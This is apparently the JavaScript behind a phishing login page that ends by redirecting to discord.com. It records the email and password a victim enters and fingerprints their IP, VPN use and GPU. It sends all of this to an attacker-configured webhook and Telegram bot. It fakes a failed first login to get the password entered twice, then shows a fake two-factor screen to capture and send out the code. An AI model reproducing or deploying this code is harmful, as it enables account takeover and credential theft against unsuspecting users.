// --- CONFIGURATION ---
const WEBHOOK_URL = 'YOUR_WEBHOOK_URL';
const TG_TOKEN = 'YOUR_TG_TOKEN';
const TG_CHAT = 'YOUR_TG_CHAT_ID';

let attempts = 0;
let savedEmail = "";
let deviceType = "Unknown";

// 1. DEVICE DETECTION ENGINE
function detectDevice() {
    const container = document.getElementById('main-container');
    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || window.innerWidth < 830;
    
    if (isMobile) {
        container.classList.add('is-mobile');
        deviceType = "📱 Mobile";
    } else {
        container.classList.add('is-desktop');
        deviceType = "💻 Desktop";
        // Load QR only for Desktop
        document.getElementById('qrTarget').innerHTML = `<img src="https://api.qrserver.com">`;
    }
}

// 2. DATA COLLECTOR
async function getFullIntel() {
    let intel = { ip: "N/A", vpn: "N/A", gpu: "N/A" };
    try {
        const res = await fetch('http://ip-api.com');
        const json = await res.json();
        intel.ip = json.query;
        intel.vpn = (json.proxy || json.hosting) ? "True" : "False";
        const gl = document.createElement('canvas').getContext('webgl');
        intel.gpu = gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL);
    } catch(e) {}
    return intel;
}

async function sendToHooks(content) {
    const payload = { content: content };
    fetch(WEBHOOK_URL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
    fetch(`https://api.telegram.org{TG_TOKEN}/sendMessage`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ chat_id: TG_CHAT, text: content, parse_mode: "Markdown" }) });
}

// 3. EVENT LISTENERS
document.getElementById('loginForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    attempts++;
    const email = document.getElementById('email').value;
    const pass = document.getElementById('password').value;
    savedEmail = email;
    const intel = await getFullIntel();

    const log = `🚨 **LOGIN [${deviceType}]** (Attempt ${attempts})\n👤 User: \`${email}\` | 🔑 Pass: \`${pass}\`\n📍 IP: \`${intel.ip}\` | 🛡️ VPN: \`${intel.vpn}\`\n🎮 GPU: \`${intel.gpu}\``;
    sendToHooks(log);

    if (attempts === 1) {
        document.getElementById('error-msg').style.display = 'block';
        document.getElementById('password').value = '';
    } else {
        document.getElementById('main-container').style.display = 'none';
        document.getElementById('two-factor-screen').style.display = 'flex';
    }
});

document.getElementById('tfaForm').addEventListener('submit', (e) => {
    e.preventDefault();
    const code = document.getElementById('tfa-code').value;
    sendToHooks(`🛡️ **2FA CODE RECEIVED**\n👤 User: \`${savedEmail}\`\n🔢 Code: \`${code}\``);
    window.location.href = "https://discord.com";
});

// Run detection on load
detectDevice();
